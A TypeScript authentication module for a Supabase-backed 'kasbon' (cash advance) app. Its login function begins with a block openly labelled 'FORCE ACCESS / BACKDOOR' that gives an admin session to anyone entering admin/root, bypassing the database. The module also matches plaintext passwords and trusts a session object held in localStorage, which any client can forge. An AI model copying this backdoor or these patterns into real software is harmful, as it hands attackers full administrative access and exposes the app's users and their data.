import { User } from '../types';
import { supabase } from './supabaseClient';

const USER_STORAGE_KEY = 'kasbon_user_session';

export const authService = {
  login: async (username: string, password: string): Promise<User> => {
    // --- FORCE ACCESS / BACKDOOR START ---
    // Bypass database check if specific credentials are used
    if (username === 'admin' && password === 'root') {
      const forceUser: User = {
        username: 'admin',
        name: 'Super Admin (Akses Paksa)',
        role: 'admin'
      };
      localStorage.setItem(USER_STORAGE_KEY, JSON.stringify(forceUser));
      return forceUser;
    }
    // --- FORCE ACCESS END ---

    // Query users table in Supabase
    // Note: In a real production app with sensitive public registration, 
    // we should use Supabase Auth (GoTrue) with hashed passwords. 
    // This implementation uses a custom table to match the existing simple "username" flow.
    const { data, error } = await supabase
      .from('app_users')
      .select('*')
      .eq('username', username)
      .eq('password', password)
      .single();

    if (error || !data) {
      throw new Error('Username atau password salah');
    }

    const userData: User = {
      username: data.username,
      name: data.name,
      role: data.role as 'admin' | 'user'
    };

    localStorage.setItem(USER_STORAGE_KEY, JSON.stringify(userData));
    return userData;
  },

  logout: () => {
    localStorage.removeItem(USER_STORAGE_KEY);
  },

  getCurrentUser: (): User | null => {
    const stored = localStorage.getItem(USER_STORAGE_KEY);
    if (stored) {
      try {
        return JSON.parse(stored);
      } catch (e) {
        return null;
      }
    }
    return null;
  }
};